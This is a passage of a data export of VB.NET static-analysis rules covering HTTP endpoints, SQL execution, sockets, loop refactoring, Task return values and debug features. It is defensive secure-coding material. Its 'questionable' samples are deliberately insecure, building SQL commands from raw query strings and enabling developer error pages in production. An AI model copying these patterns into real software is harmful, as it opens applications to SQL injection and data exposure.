            Return ""test""
        End Get
        Set(ByVal value As String)
        End Set
    End Property

    Public Sub New()
    End Sub

    Public Sub PublicFoo() ' Questionable. Public Controller methods are exposed as HTTP endpoints.
    End Sub

    &lt;System.Web.Mvc.NonAction&gt;
    Public Sub NotAnEndpoint() ' This is not an endpoint because of the NonAction attribute.
    End Sub

    Protected Sub ProtectedFoo()
    End Sub

    Friend Sub InternalFoo()
    End Sub

    Private Sub PrivateFoo()
    End Sub

    Private Class Bar
        Inherits System.Web.Mvc.Controller

        Public Sub InnerFoo()
        End Sub
    End Class
End Class
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",vbnet:S4529,vbnet,VB.NET,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint via .Net Framework MVC Controllers. It guides security code reviews to security-sensitive
code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<pre>
Public Class Foo
    Inherits System.Web.Mvc.Controller

    Public Property MyProperty As String
        Get
            Return ""test""
        End Get
        Set(ByVal value As String)
        End Set
    End Property

    Public Sub New()
    End Sub

    Public Sub PublicFoo() ' Questionable. Public Controller methods are exposed as HTTP endpoints.
    End Sub

    &lt;System.Web.Mvc.NonAction&gt;
    Public Sub NotAnEndpoint() ' This is not an endpoint because of the NonAction attribute.
    End Sub

    Protected Sub ProtectedFoo()
    End Sub

    Friend Sub InternalFoo()
    End Sub

    Private Sub PrivateFoo()
    End Sub

    Private Class Bar
        Inherits System.Web.Mvc.Controller

        Public Sub InnerFoo()
        End Sub
    End Class
End Class
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Exposing HTTP endpoints is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'owasp-a7', 'sans-top25-insecure', 'sans-top25-porous', 'sans-top25-risky', 'spring']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule checks a variety of methods which are susceptible to SQL injection if not used properly. Any SQL query built from a String or a
RawSqlString is considered susceptible. The goal is to guide security code reviews.</p>
<p>The following specific method signatures are tested:</p>
<ul>
  <li> <code>System.Data.SqlClient.SqlCommand.SqlCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlClient.SqlDataAdapter.SqlDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.OdbcCommand(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcDataAdapter.OdbcDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.SqlCeCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeDataAdapter.SqlCeDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.OracleCommand(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleDataAdapter.OracleDataAdapter(string, ...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommand(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommandAsync(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalQueryableExtensions.FromSql&lt;TEntity&gt;(System.Linq.IQueryable&lt;TEntity&gt;,
  System.FormattableString)</code> </li>
  <li> <code>System.Data.SqlClient.SqlCommand.CommandText.set</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.CommandText.set</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.CommandText.set</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.CommandText.set</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> You may also use ORM frameworks such as Hibernate which, if used correctly, reduce injection risks. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
Public Sub SqlCommands(ByVal connection As SqlConnection, ByVal query As String)
    Dim command As SqlCommand
    command = New SqlCommand(query) ' Questionable

    command.CommandText = query ' Questionable

    Dim adapter As SqlDataAdapter
    adapter = New SqlDataAdapter(query, connection) ' Questionable
End Sub

Public Sub Foo(ByVal context As DbContext, ByVal query As String)
    context.Database.ExecuteSqlCommand(query) ' Questionable

    context.Query(Of User)().FromSql(query) ' Questionable
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",vbnet:S2077,vbnet,VB.NET,"<p>Executing SQL queries is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9019"">CVE-2018-9019</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7318"">CVE-2018-7318</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611"">CVE-2017-5611</a> </li>
</ul>
<p><a href=""https://www.owasp.org/index.php/SQL_Injection"">SQL injection</a> is still one of the top 10 security vulnerabilities. Applications that
execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include
input that changes the query so that unintended commands are executed, or sensitive data is exposed. Instead of trying to sanitize data by hand, SQL
binding mechanisms should be used; they can be relied on to automatically perform a full sanitization.</p>
<p>This rule checks a variety of methods which are susceptible to SQL injection if not used properly. Any SQL query built from a String or a
RawSqlString is considered susceptible. The goal is to guide security code reviews.</p>
<p>The following specific method signatures are tested:</p>
<ul>
  <li> <code>System.Data.SqlClient.SqlCommand.SqlCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlClient.SqlDataAdapter.SqlDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.OdbcCommand(string, ...)</code> </li>
  <li> <code>System.Data.Odbc.OdbcDataAdapter.OdbcDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.SqlCeCommand(string, ...)</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeDataAdapter.SqlCeDataAdapter(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.OracleCommand(string, ...)</code> </li>
  <li> <code>System.Data.OracleClient.OracleDataAdapter.OracleDataAdapter(string, ...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommand(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalDatabaseFacadeExtensions.ExecuteSqlCommandAsync(...)</code> </li>
  <li> <code>Microsoft.EntityFrameworkCore.RelationalQueryableExtensions.FromSql&lt;TEntity&gt;(System.Linq.IQueryable&lt;TEntity&gt;,
  System.FormattableString)</code> </li>
  <li> <code>System.Data.SqlClient.SqlCommand.CommandText.set</code> </li>
  <li> <code>System.Data.Odbc.OdbcCommand.CommandText.set</code> </li>
  <li> <code>System.Data.SqlServerCe.SqlCeCommand.CommandText.set</code> </li>
  <li> <code>System.Data.OracleClient.OracleCommand.CommandText.set</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the SQL query contains any non sanitized input from a user or another untrusted source. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid building queries manually using concatenation or formatting. If you do it anyway, do not include user input in this building process.
  </li>
  <li> Use <a href=""https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"">parameterized queries, prepared statements, or stored
  procedures</a> whenever possible. </li>
  <li> You may also use ORM frameworks such as Hibernate which, if used correctly, reduce injection risks. </li>
  <li> Avoid executing SQL queries containing unsafe input in stored procedures or functions. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every unsafe input. </li>
</ul>
<p>You can also reduce the impact of an attack by using a database account with low privileges.</p>
<h2>Questionable Code Example</h2>
<pre>
Public Sub SqlCommands(ByVal connection As SqlConnection, ByVal query As String)
    Dim command As SqlCommand
    command = New SqlCommand(query) ' Questionable

    command.CommandText = query ' Questionable

    Dim adapter As SqlDataAdapter
    adapter = New SqlDataAdapter(query, connection) ' Questionable
End Sub

Public Sub Foo(ByVal context As DbContext, ByVal query As String)
    context.Database.ExecuteSqlCommand(query) ' Questionable

    context.Query(Of User)().FromSql(query) ' Questionable
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA"">Potential SQL/JPQL Injection
  (JPA)</a>, <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO"">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE"">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>",Executing SQL queries is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Net.Sockets

Public Class Sockets

    Public Shared Sub Run()
        ' Questionable
        Dim socket As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

        ' TcpClient And UdpClient simply abstract the details of creating a Socket
        Dim client As TcpClient = New TcpClient(""example.com"", 80) ' Questionable
        Dim listener As UdpClient = New UdpClient(80)   ' Questionable
    End Sub

End Class
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",vbnet:S4818,vbnet,VB.NET,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Net.Sockets

Public Class Sockets

    Public Shared Sub Run()
        ' Questionable
        Dim socket As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

        ' TcpClient And UdpClient simply abstract the details of creating a Socket
        Dim client As TcpClient = New TcpClient(""example.com"", 80) ' Questionable
        Dim listener As UdpClient = New UdpClient(80)   ' Questionable
    End Sub

End Class
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using Sockets is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2017-11-14T07:57:44+0100,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
For i As Integer = 0 To 10   'noncompliant, loop only executes once
  foo(i)
  Exit For
Next
...
For i As Integer = 0 To 10   'noncompliant, loop only executes once
  If i = Something
    Exit For
  Else
    foo(i)
    Return
  End If
Next
</pre>
<h2>Compliant Solution</h2>
<pre>
For i As Integer = 0 To 10
  foo(i)
Next
...
For i As Integer = 0 To 10
  If i = Something
    Exit For
  Else
    foo(i)
  End If
Next
</pre>",vbnet:S1751,vbnet,VB.NET,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
For i As Integer = 0 To 10   'noncompliant, loop only executes once
  foo(i)
  Exit For
Next
...
For i As Integer = 0 To 10   'noncompliant, loop only executes once
  If i = Something
    Exit For
  Else
    foo(i)
    Return
  End If
Next
</pre>
<h2>Compliant Solution</h2>
<pre>
For i As Integer = 0 To 10
  foo(i)
Next
...
For i As Integer = 0 To 10
  If i = Something
    Exit For
  Else
    foo(i)
  End If
Next
</pre>",Loops with at most one iteration should be refactored,[],MAJOR,[],BUG
2018-11-06T12:16:59+0100,"<p>Returning <code>Nothing</code> from a non-<code>async</code> <code>Task</code>/<code>Task(Of T)</code> method will cause a
<code>NullReferenceException</code> at runtime. This problem can be avoided by returning <code>Task.FromResult(Of T)(Nothing)</code> instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function GetFooAsync() As Task(Of Object)
    Return Nothing
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function GetFooAsync() As Task(Of Object)
    Return Task.FromResult(Of Object)(Nothing)
End Function
</pre>",vbnet:S4586,vbnet,VB.NET,"<p>Returning <code>Nothing</code> from a non-<code>async</code> <code>Task</code>/<code>Task(Of T)</code> method will cause a
<code>NullReferenceException</code> at runtime. This problem can be avoided by returning <code>Task.FromResult(Of T)(Nothing)</code> instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function GetFooAsync() As Task(Of Object)
    Return Nothing
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function GetFooAsync() As Task(Of Object)
    Return Task.FromResult(Of Object)(Nothing)
End Function
</pre>","Non-async ""Task/Task<T>"" methods should not return null",[],CRITICAL,[],BUG
2018-11-29T11:10:38+0100,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debug features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>If env.IsDevelopment()</code> to disable debug code.</p>
<h2>Questionable Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>. No Issue is raised when those calls are disabled by <code>if
(env.IsDevelopment())</code>.</p>
<pre>
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting

Namespace MyMvcApp
    Public Class Startup
        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)
            If env.IsDevelopment() Then
                app.UseDeveloperExceptionPage()
                app.UseDatabaseErrorPage()
            End If

            app.UseDeveloperExceptionPage()
            app.UseDatabaseErrorPage()
        End Sub
    End Class
End Namespace
</pre>
<h2>Exceptions</h2>
<p>This rule does not analyze configuration files. Make sure that debug mode is not enabled by default in those files.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",vbnet:S4507,vbnet,VB.NET,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
